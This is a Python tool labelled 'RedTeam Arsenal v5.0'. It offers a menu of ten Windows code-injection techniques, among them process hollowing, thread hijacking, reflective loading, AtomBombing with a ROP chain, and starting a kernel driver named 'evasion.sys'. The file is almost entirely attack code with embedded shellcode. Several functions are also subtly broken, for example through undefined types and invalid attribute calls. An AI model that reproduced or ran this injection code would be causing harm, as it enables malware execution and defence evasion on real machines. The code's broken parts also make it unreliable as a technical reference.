import os
import sys
import ctypes
import struct
import time
import psutil
import subprocess
from ctypes import wintypes, windll, POINTER, sizeof, c_void_p, c_char
from tkinter import filedialog, Tk

# === WinAPI ===
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi

# === Constants ===
PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS = 0x1F03FF
MEM_COMMIT_RESERVE = 0x3000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x4

# === Structures ===
class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPSTR), ("lpDesktop", wintypes.LPSTR),
                ("lpTitle", wintypes.LPSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD), ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD), ("lpReserved2", wintypes.LPBYTE),
                ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", wintypes.ULONG64), ("P2Home", wintypes.ULONG64), ("P3Home", wintypes.ULONG64),
        ("P4Home", wintypes.ULONG64), ("P5Home", wintypes.ULONG64), ("P6Home", wintypes.ULONG64),
        ("ContextFlags", wintypes.DWORD), ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD), ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD), ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", wintypes.ULONG64), ("Dr1", wintypes.ULONG64), ("Dr2", wintypes.ULONG64),
        ("Dr3", wintypes.ULONG64), ("Dr6", wintypes.ULONG64), ("Dr7", wintypes.ULONG64),
        ("Rax", wintypes.ULONG64), ("Rcx", wintypes.ULONG64), ("Rdx", wintypes.ULONG64),
        ("Rbx", wintypes.ULONG64), ("Rsp", wintypes.ULONG64), ("Rbp", wintypes.ULONG64),
        ("Rsi", wintypes.ULONG64), ("Rdi", wintypes.ULONG64), ("R8", wintypes.ULONG64),
        ("R9", wintypes.ULONG64), ("R10", wintypes.ULONG64), ("R11", wintypes.ULONG64),
        ("R12", wintypes.ULONG64), ("R13", wintypes.ULONG64), ("R14", wintypes.ULONG64),
        ("R15", wintypes.ULONG64),
        ("Rip", wintypes.ULONG64),
    ]

# === Helpers ===
def log(msg): print(f"[+] {msg}")
def error(msg): print(f"[!] {msg}")

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def get_dll_path():
    root = Tk()
    root.withdraw()
    path = filedialog.askopenfilename(title="Select DLL/EXE", filetypes=[("Executable", "*.dll;*.exe")])
    root.destroy()
    return path

def select_pid():
    print("\n" + "="*70)
    print(" " * 25 + "TARGET PROCESS LIST")
    print("="*70)
    procs = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            if p.info['pid'] > 50:
                print(f"[{len(procs)+1:2}] PID: {p.info['pid']:6} | {p.info['name']}")
                procs.append(p.info['pid'])
        except: pass
    print("="*70)
    while True:
        try:
            i = int(input("Select [1]: ")) - 1
            if 0 <= i < len(procs):
                return procs[i]
        except: pass

# === 1. Standard ===
def standard_injection(pid, dll_path):
    log("Standard (CreateRemoteThread)")
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    path = dll_path.encode('ascii') + b'\x00'
    mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h, mem, path, len(path), None)
    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    ht = kernel32.CreateRemoteThread(h, None, 0, loadlib, mem, 0, None)
    kernel32.WaitForSingleObject(ht, INFINITE)
    kernel32.CloseHandle(ht)
    kernel32.CloseHandle(h)
    log("Loaded")

# === 2. APC ===
def apc_injection(pid, dll_path):
    log("APC (QueueUserAPC)")
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    path = dll_path.encode('ascii') + b'\x00'
    mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h, mem, path, len(path), None)
    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    queued = 0
    for t in psutil.Process(pid).threads():
        ht = kernel32.OpenThread(THREAD_ALL_ACCESS, False, t.id)
        if ht and kernel32.QueueUserAPC(loadlib, ht, mem):
            queued += 1
        if ht: kernel32.CloseHandle(ht)
    kernel32.CloseHandle(h)
    log(f"Queued on {queued} threads")

# === 3. Early Bird ===
def early_bird_injection(exe_path, dll_path):
    log("Early Bird APC")
    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)
    if not kernel32.CreateProcessW(exe_path, None, None, None, False, 0x4, None, None, ctypes.byref(si), ctypes.byref(pi)):
        return error("CreateProcess failed")
    h = pi.hProcess
    path = dll_path.encode('ascii') + b'\x00'
    mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h, mem, path, len(path), None)
    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    kernel32.QueueUserAPC(loadlib, pi.hThread, mem)
    kernel32.ResumeThread(pi.hThread)
    log("Resumed")

# === 4. Thread Hijack ===
def thread_hijack_injection(pid, dll_path):
    log("Thread Hijack")
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    path = dll_path.encode('ascii') + b'\x00'
    mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h, mem, path, len(path), None)
    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    shellcode = (
        b"\x48\x83\xEC\x28" +
        b"\x48\xB9" + struct.pack("<Q", mem) +
        b"\x48\xB8" + struct.pack("<Q", loadlib) +
        b"\xFF\xD0" +
        b"\x48\x83\xC4\x28" +
        b"\xC3"
    )
    code = kernel32.VirtualAllocEx(h, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, code, shellcode, len(shellcode), None)
    for t in psutil.Process(pid).threads():
        ht = kernel32.OpenThread(THREAD_ALL_ACCESS, False, t.id)
        if ht:
            context = (ctypes.c_ulonglong * 18)()
            context[16] = code
            kernel32.SetThreadContext(ht, ctypes.byref(context))
            kernel32.ResumeThread(ht)
            kernel32.CloseHandle(ht)
            break
    kernel32.CloseHandle(h)
    log("Hijacked")

# === 5. Reflective ===
def reflective_injection(pid, dll_path):
    log("Reflective DLL")
    with open(dll_path, "rb") as f: dll = f.read()
    e_lfanew = struct.unpack("<I", dll[0x3C:0x40])[0]
    entry_rva = struct.unpack("<I", dll[e_lfanew + 0x28:e_lfanew + 0x2C])[0]
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    base = kernel32.VirtualAllocEx(h, None, len(dll), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, base, dll, len(dll), None)
    entry = base + entry_rva
    ht = kernel32.CreateRemoteThread(h, None, 0, entry, 0, 0, None)
    kernel32.WaitForSingleObject(ht, INFINITE)
    kernel32.CloseHandle(ht)
    kernel32.CloseHandle(h)
    log("Executed")

# === 6. Manual Map ===
def manual_map_injection(pid, dll_path):
    log("Manual Map")
    with open(dll_path, "rb") as f: dll = f.read()
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    section = ntdll.NtCreateSection(0, 0x10000000, None, None, 0x4, 0x8000000, None)
    local_base = wintypes.HANDLE()
    remote_base = wintypes.HANDLE()
    size = wintypes.ULARGE_INTEGER(len(dll))
    ntdll.NtMapViewOfSection(section, kernel32.GetCurrentProcess(), ctypes.byref(local_base), 0, 0, None, ctypes.byref(size), 1, 0, 0x4)
    ctypes.memmove(local_base.value, dll, len(dll))
    ntdll.NtMapViewOfSection(section, h, ctypes.byref(remote_base), 0, 0, None, ctypes.byref(size), 1, 0, 0x40)
    log(f"Mapped at 0x{remote_base.value:X}")
    kernel32.CloseHandle(h)

# === 7. FULL PROCESS HOLLOWING ===
def process_hollowing(exe_path, dll_path):
    log("Process Hollowing (RunPE)")
    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)
    kernel32.CreateProcessW(exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))

    with open(dll_path, "rb") as f:
        pe_data = f.read()

    # Parse headers
    e_lfanew = struct.unpack("<I", pe_data[60:64])[0]
    pe_sig = pe_data[e_lfanew:e_lfanew+4]
    if pe_sig != b"PE\x00\x00":
        return error("Invalid PE")
    image_base = struct.unpack("<Q", pe_data[e_lfanew+0x30:e_lfanew+0x38])[0]
    size_of_image = struct.unpack("<I", pe_data[e_lfanew+0x50:e_lfanew+0x54])[0]

    # Unmap
    ntdll.NtUnmapViewOfSection(pi.hProcess, image_base)

    # Allocate new image
    new_base = kernel32.VirtualAllocEx(pi.hProcess, image_base, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    if not new_base:
        new_base = kernel32.VirtualAllocEx(pi.hProcess, None, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)

    # Write headers + sections
    kernel32.WriteProcessMemory(pi.hProcess, new_base, pe_data, 0x1000, None)
    for i in range(struct.unpack("<H", pe_data[e_lfanew+0x06:e_lfanew+0x08])[0]):
        sec = pe_data[e_lfanew+0xF8 + i*40 : e_lfanew+0xF8 + (i+1)*40]
        ptr = struct.unpack("<I", sec[20:24])[0]
        size = struct.unpack("<I", sec[16:20])[0]
        dest = new_base + ptr
        kernel32.WriteProcessMemory(pi.hProcess, dest, pe_data[ptr:ptr+size], size, None)

    # Fix base
    context = CONTEXT()
    context.ContextFlags = 0x100000
    kernel32.GetThreadContext(pi.hThread, ctypes.byref(context))
    kernel32.WriteProcessMemory(pi.hProcess, context.Rcx + 0x10, struct.pack("<Q", new_base + struct.unpack("<I", pe_data[e_lfanew+0x28:e_lfanew+0x2C])[0]), 8, None)
    context.Rip = new_base + struct.unpack("<I", pe_data[e_lfanew+0x28:e_lfanew+0x2C])[0]
    kernel32.SetThreadContext(pi.hThread, ctypes.byref(context))

    kernel32.ResumeThread(pi.hThread)
    log("Hollowed & resumed")

# === 8. FULL THREAD POOL INJECTION ===
def thread_pool_injection(pid, dll_path):
    log("Thread Pool (TpAllocWork)")
    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h: return error("OpenProcess failed")

    ntdll = ctypes.WinDLL('ntdll')
    TpAllocPool = ctypes.WINFUNCTYPE(ctypes.c_int, PTP_POOL, c_void_p)(('TpAllocPool', ntdll))
    TpAllocWork = ctypes.WINFUNCTYPE(ctypes.c_int, PTP_POOL, PTP_WORK_CALLBACK, c_void_p, PTP_CLEANUP_GROUP)(('TpAllocWork', ntdll))
    TpPostWork = ctypes.WINFUNCTYPE(None, PTP_WORK)(('TpPostWork', ntdll))

    remote_path = kernel32.VirtualAllocEx(h, None, 260, MEM_COMMIT_RESERVE, PAGE_READWRITE)
    path_bytes = dll_path.encode('utf-16le') + b'\x00\x00'
    kernel32.WriteProcessMemory(h, remote_path, path_bytes, len(path_bytes), None)

    loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
    shellcode = (
        b"\x48\x83\xEC\x28" +
        b"\x48\xB9" + struct.pack("<Q", remote_path) +
        b"\x48\xB8" + struct.pack("<Q", loadlib) +
        b"\xFF\xD0" +
        b"\x48\x83\xC4\x28" +
        b"\xC3"
    )
    remote_code = kernel32.VirtualAllocEx(h, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, remote_code, shellcode, len(shellcode), None)

    remote_pool = kernel32.VirtualAllocEx(h, None, 8, MEM_COMMIT_RESERVE, PAGE_READWRITE)
    remote_work = kernel32.VirtualAllocEx(h, None, 8, MEM_COMMIT_RESERVE, PAGE_READWRITE)

    # TpAllocPool
    shell_tp = (
        b"\x48\xB9" + struct.pack("<Q", remote_pool) +
        b"\x48\xC7\xC2\x00\x00\x00\x00" +
        b"\x48\xB8" + struct.pack("<Q", ntdll.TpAllocPool.address) +
        b"\xFF\xD0" +
        b"\xC3"
    )
    remote_tp = kernel32.VirtualAllocEx(h, None, len(shell_tp), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, remote_tp, shell_tp, len(shell_tp), None)
    ht = kernel32.CreateRemoteThread(h, None, 0, remote_tp, 0, 0, None)
    kernel32.WaitForSingleObject(ht, INFINITE)
    kernel32.CloseHandle(ht)

    pool_ptr = wintypes.HANDLE()
    kernel32.ReadProcessMemory(h, remote_pool, ctypes.byref(pool_ptr), 8, None)

    # TpAllocWork
    shell_work = (
        b"\x48\xB9" + struct.pack("<Q", pool_ptr.value) +
        b"\x48\xBA" + struct.pack("<Q", remote_code) +
        b"\x48\xC7\xC1\x00\x00\x00\x00" +
        b"\x4D\x31\xC9" +
        b"\x48\xB8" + struct.pack("<Q", ntdll.TpAllocWork.address) +
        b"\xFF\xD0" +
        b"\x48\x89\x02" +
        b"\xC3"
    )
    remote_work_alloc = kernel32.VirtualAllocEx(h, None, len(shell_work), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, remote_work_alloc, shell_work, len(shell_work), None)
    ht = kernel32.CreateRemoteThread(h, None, 0, remote_work_alloc, remote_work, 0, None)
    kernel32.WaitForSingleObject(ht, INFINITE)
    kernel32.CloseHandle(ht)

    work_ptr = wintypes.HANDLE()
    kernel32.ReadProcessMemory(h, remote_work, ctypes.byref(work_ptr), 8, None)

    # TpPostWork
    shell_post = (
        b"\x48\xB9" + struct.pack("<Q", work_ptr.value) +
        b"\x48\xB8" + struct.pack("<Q", ntdll.TpPostWork.address) +
        b"\xFF\xD0" +
        b"\xC3"
    )
    remote_post = kernel32.VirtualAllocEx(h, None, len(shell_post), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h, remote_post, shell_post, len(shell_post), None)
    ht = kernel32.CreateRemoteThread(h, None, 0, remote_post, 0, 0, None)
    kernel32.WaitForSingleObject(ht, INFINITE)
    kernel32.CloseHandle(ht)

    log("Thread pool work posted")
    kernel32.CloseHandle(h)

# === 9. Kernel Driver ===
def kernel_driver_injection():
    log("Loading evasion.sys")
    driver_path = os.path.abspath("drivers/evasion.sys")
    if not os.path.exists(driver_path):
        return error("evasion.sys not found. Run build.py")
    subprocess.run(f'sc create evasion binPath= "{driver_path}" type= kernel', shell=True)
    subprocess.run('sc start evasion', shell=True)
    log("Driver started")

# === 10. ATOMBOMBING ===
def atombombing_injection(pid, dll_path):
    log("AtomBombing Injection")
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process: return error("OpenProcess failed")

    dll_bytes = dll_path.encode('ascii') + b'\x00'
    loadlib_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    shellcode = (
        b"\x48\x83\xEC\x28" +
        b"\x48\xB9" + struct.pack("<Q", ctypes.cast(dll_bytes, ctypes.c_void_p).value) +
        b"\x48\xB8" + struct.pack("<Q", loadlib_addr) +
        b"\xFF\xD0" +
        b"\x48\x83\xC4\x28" +
        b"\xC3"
    )

    atom_ids = []
    offset = 0
    while offset < len(shellcode):
        chunk = shellcode[offset:offset+255]
        atom_name = chunk + b'\x00' * (255 - len(chunk))
        atom_id = kernel32.GlobalAddAtomW(atom_name)
        if not atom_id: return error("GlobalAddAtom failed")
        atom_ids.append(atom_id)
        offset += 255
    log(f"Smuggled {len(shellcode)} bytes via {len(atom_ids)} atoms")

    shell_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)

    def find_gadget(pattern):
        modules = (wintypes.HMODULE * 1024)()
        needed = wintypes.DWORD()
        psapi.EnumProcessModules(h_process, modules, sizeof(modules), ctypes.byref(needed))
        for hmod in modules:
            if not hmod: break
            name = (ctypes.c_char * 260)()
            psapi.GetModuleFileNameExA(h_process, hmod, name, 260)
            if b"kernelbase.dll" in name.value.lower():
                info = wintypes.MODULEINFO()
                psapi.GetModuleInformation(h_process, hmod, ctypes.byref(info), sizeof(info))
                data = (ctypes.c_char * info.SizeOfImage)()
                kernel32.ReadProcessMemory(h_process, info.lpBaseOfDll, data, info.SizeOfImage, None)
                raw = ctypes.string_at(data, info.SizeOfImage)
                pos = raw.find(pattern)
                if pos != -1:
                    return info.lpBaseOfDll + pos
        return None

    pop_rax_ret = find_gadget(b"\x58\xc3")
    jmp_rax = find_gadget(b"\xff\xe0")
    if not all([pop_rax_ret, jmp_rax]): return error("Gadget not found")

    retrieve_code = b""
    dest = shell_mem
    for atom_id in atom_ids:
        retrieve_code += (
            b"\x48\xB9" + struct.pack("<Q", atom_id) +
            b"\x48\xBA" + struct.pack("<Q", dest) +
            b"\x48\xB8" + struct.pack("<Q", kernel32.GlobalGetAtomNameW) +
            b"\xFF\xD0" +
            b"\x48\x83\xC2\xFF"
        )
        dest += 255
    retrieve_code += (
        b"\x48\xB8" + struct.pack("<Q", shell_mem) +
        b"\xFF\xE0"
    )

    retrieve_mem = kernel32.VirtualAllocEx(h_process, None, len(retrieve_code), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h_process, retrieve_mem, retrieve_code, len(retrieve_code), None)

    rop_chain = struct.pack("<Q", pop_rax_ret) + b"A"*8 + struct.pack("<Q", retrieve_mem) + struct.pack("<Q", jmp_rax)
    rop_mem = kernel32.VirtualAllocEx(h_process, None, len(rop_chain), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(h_process, rop_mem, rop_chain, len(rop_chain), None)

    h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, psutil.Process(pid).threads()[0].id)
    ctx = CONTEXT()
    ctx.ContextFlags = 0x100000
    ctx.Rip = rop_mem
    ctx.Rsp = shell_mem + 0x1000
    ctx_mem = kernel32.VirtualAllocEx(h_process, None, sizeof(CONTEXT), MEM_COMMIT_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h_process, ctx_mem, ctypes.byref(ctx), sizeof(CONTEXT), None)

    nt_queue_apc = ntdll.NtQueueApcThread
    nt_queue_apc.argtypes = [wintypes.HANDLE, c_void_p, c_void_p, c_void_p, wintypes.ULONG]
    status = nt_queue_apc(h_thread, ntdll.NtContinue, ctx_mem, None, 0)

    log("APC queued" if status == 0 else f"Failed: 0x{status:X}")
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    for atom_id in atom_ids: kernel32.GlobalDeleteAtom(atom_id)

# === MENU ===
METHODS = [
    ("1. Standard", standard_injection),
    ("2. APC", apc_injection),
    ("3. Early Bird", early_bird_injection),
    ("4. Thread Hijack", thread_hijack_injection),
    ("5. Reflective", reflective_injection),
    ("6. Manual Map", manual_map_injection),
    ("7. Process Hollowing", process_hollowing),
    ("8. Thread Pool", thread_pool_injection),
    ("9. Kernel Driver", kernel_driver_injection),
    ("10. AtomBombing", atombombing_injection),
]

if __name__ == "__main__":
    if not is_admin():
        error("Run as Administrator!")
        sys.exit(1)

    print("RedTeam Arsenal v5.0 – ALL 10 METHODS")
    for i, (name, _) in enumerate(METHODS, 1):
        print(f"[{i:2}] {name}")

    choice = int(input("\nSelect [1-10]: ")) - 1
    name, func = METHODS[choice]

    if name in ["3. Early Bird", "7. Process Hollowing"]:
        exe = input("EXE path: ").strip('"')
        dll = get_dll_path() or input("DLL path: ").strip('"')
        func(exe, dll)
    elif name == "9. Kernel Driver":
        func()
    else:
        pid = select_pid()
        dll = get_dll_path() or input("DLL path: ").strip('"')
        func(pid, dll)

    print(f"\n{name} complete.")
